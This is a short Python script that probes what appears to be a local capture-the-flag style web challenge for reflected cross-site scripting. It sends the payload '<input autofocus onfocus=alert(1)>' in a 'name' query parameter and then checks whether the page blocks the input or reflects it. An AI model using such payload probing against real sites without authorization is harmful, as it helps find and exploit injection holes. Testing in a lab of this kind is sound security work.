import urllib.request, sys, re
port = sys.argv[1] if len(sys.argv) > 1 else "52795"

# Simple test with no encoding issues
r = urllib.request.urlopen("http://localhost:{}/page?name=test".format(port))
html = r.read().decode()
print("BODY:")
print(html[:600])
print()

# Test with angle brackets (unescaped)
payload = '<input autofocus onfocus=alert(1)>'
url = "http://localhost:{}/page?name=".format(port) + urllib.parse.quote(payload)
r = urllib.request.urlopen(url)
html = r.read().decode()
m = re.search(r"solution-text[^>]*>([^<]+)", html)
if m:
    print("BLOCK REASON:", m.group(1))
else:
    print("NO BLOCK")
    # Check for reflection
    if payload[:10] in html:
        print("PAYLOAD REFLECTED")
    else:
        print("PAYLOAD GONE - check manually")
        # Show relevant part
        idx = html.find("box-form")
        if idx > 0:
            print(html[idx:idx+500])
